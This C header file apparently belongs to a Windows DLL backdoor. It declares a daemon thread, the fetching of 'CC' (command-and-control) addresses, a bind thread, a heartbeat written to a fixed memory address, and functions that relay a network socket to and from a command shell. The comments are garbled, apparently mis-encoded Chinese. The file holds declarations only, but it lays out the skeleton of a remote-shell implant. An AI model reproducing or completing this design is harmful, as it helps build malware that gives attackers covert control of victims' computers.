#ifndef _FUNCS_H_
#define _FUNCS_H_

#include <winsock2.h>
#pragma comment( lib , "Ws2_32.lib" )
#pragma comment( lib , "User32.lib" )
//#include <Windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>

#define _DEBUG_ // ����ʱ������
//#define _DEBUG_PRINT_
#define _DEBUG_PRINT_TO_FILE_ // PRINT ���� _DEBUG_PRINT_ ������ļ�
#define _DEBUG_PRINT_FILE_NAME_ "c:\\xjj.log"
#define CHECK_LOCAL_TIME_SPLIT (60) // �鱾��ʱ�䲢�� CC �ļ������Ч��ɱ�� daemon
#define RANDOM_SEND_GET_SPLIT_RANGE (10) // �� CC ʱ�������ʱ������ֵ
#define BIND_SPLIT_RANDOM_BASE (4)	// ���� bind ����֮��ļ��
#define BIND_SPLIT_RANDOM_RANGE (2)	// ���� bind ����֮��ļ��
#define DEFAULT_BUFLEN (44) // must larger than lenth "wassup000.000.000.000:00000wassup"
#define DEFAULT_PORT (80)
#define HEART_BEAT_WRITE_MEMORY
#define HEART_BEAT_ADDRESS (0x1ff00)
#define HEART_BEAT_SPLIT (4) // �������

#ifdef _DEBUG_PRINT_
	#define MESSAGEBOX( ... ) MessageBox( __VA_ARGS__ )
	#define PRINTF( ... ) printf( __VA_ARGS__ )
#else
	#define MESSAGEBOX( ... ) ( void* )0
	#define PRINTF( ... ) ( void* )0
#endif
#ifdef _DEBUG_PRINT_TO_FILE_
static FILE *f_handle ;
#undef PRINTF
#define PRINTF( ... )                                   \
  {                                                     \
  f_handle = fopen( _DEBUG_PRINT_FILE_NAME_ , "a" ) ;   \
  fprintf( f_handle , __VA_ARGS__ ) ;                   \
  fclose( f_handle ) ;                                  \
  }
#endif

__declspec(dllexport) BOOL WINAPI DllMain(
  _In_ HINSTANCE hinstDLL,
  _In_ DWORD     fdwReason,
  _In_ LPVOID    lpvReserved
);
DWORD WINAPI DaemonThread( LPVOID lpParam ) ; // DONE
DWORD WINAPI BindThread( LPVOID lpParam ) ; // twist
BOOLEAN CheckLocalTime( ) ; // DONE
void GetCCInfo( char* address ) ; // DONE
BOOLEAN CheckAddress( char* address ) ; // DONE
DWORD WINAPI ClientSocketToShell(LPVOID lpParameter) ; // copy from stackoverflow.com
DWORD WINAPI ShellToClientSocket(LPVOID lpParameter) ; // copy from stackoverflow.com
#ifdef HEART_BEAT_WRITE_MEMORY
DWORD WINAPI HeartBeatThread( LPVOID lpParam ) ;
#endif
BOOL CheckHeartBeat( ) ;

typedef struct _sThreadInfo
{
    SOCKET Socket;
    HANDLE hStdIn;
    HANDLE hStdOut;
    BOOLEAN Stop;
} sThreadInfo ;

typedef struct _timeval {
  long tv_sec;
  long tv_usec;
} _timeval;

#endif // end of _FUNCS_H_
